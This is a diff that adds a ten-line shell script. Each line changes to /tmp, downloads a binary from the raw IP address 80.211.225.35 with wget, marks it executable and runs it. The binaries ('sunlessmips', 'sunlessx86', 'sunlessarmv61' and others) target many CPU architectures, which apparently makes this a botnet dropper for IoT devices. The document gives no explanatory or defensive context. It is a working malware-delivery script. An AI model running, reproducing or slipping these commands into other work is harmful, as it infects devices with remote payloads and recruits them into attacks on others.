@@ -1,0 +1,10 @@
+cd /tmp && wget -q http://80.211.225.35/sunlessmipsel && chmod +x sunlessmipsel && ./sunlessmipsel
+cd /tmp && wget -q http://80.211.225.35/sunlessmips && chmod +x sunlessmips && ./sunlessmips
+cd /tmp && wget -q http://80.211.225.35/sunlesssh4 && chmod +x sunlesssh4 && ./sunlesssh4
+cd /tmp && wget -q http://80.211.225.35/sunlessx86 && chmod +x sunlessx86 && ./sunlessx86
+cd /tmp && wget -q http://80.211.225.35/sunlessarmv61 && chmod +x sunlessarmv61 && ./sunlessarmv61
+cd /tmp && wget -q http://80.211.225.35/sunlessi686 && chmod +x sunlessi686 && ./sunlessi686
+cd /tmp && wget -q http://80.211.225.35/sunlesspowerpc && chmod +x sunlesspowerpc && ./sunlesspowerpc
+cd /tmp && wget -q http://80.211.225.35/sunlessi586 && chmod +x sunlessi586 && ./sunlessi586
+cd /tmp && wget -q http://80.211.225.35/sunlessm86k && chmod +x sunlessm86k && ./sunlessm86k
+cd /tmp && wget -q http://80.211.225.35/sunlesssparc && chmod +x sunlesssparc && ./sunlesssparc
